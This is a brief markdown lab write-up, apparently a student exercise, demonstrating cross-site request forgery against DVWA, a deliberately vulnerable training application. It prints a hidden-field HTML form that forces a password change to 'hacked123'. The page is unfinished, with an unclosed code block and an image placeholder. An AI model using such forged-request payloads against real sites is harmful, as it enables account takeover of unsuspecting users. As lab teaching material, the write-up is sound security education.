
---

#  CSRF.md

```markdown
# Cross-Site Request Forgery (CSRF) – DVWA

## Objective
To demonstrate how CSRF can force a victim to perform unwanted actions.

---

## What is CSRF?
CSRF tricks authenticated users into executing unwanted actions without their knowledge.

---

## Exploitation Steps

1. Open DVWA → CSRF.
2. Capture request in Burp Suite.
3. Observe password change request.
4. Create malicious HTML:

```html
<form action="http://target/dvwa/vulnerabilities/csrf/" method="GET">
<input type="hidden" name="password_new" value="hacked123">
<input type="hidden" name="password_conf" value="hacked123">
<input type="submit">
</form>

When victim loads page, password changes.
![Uploading image.png…]()
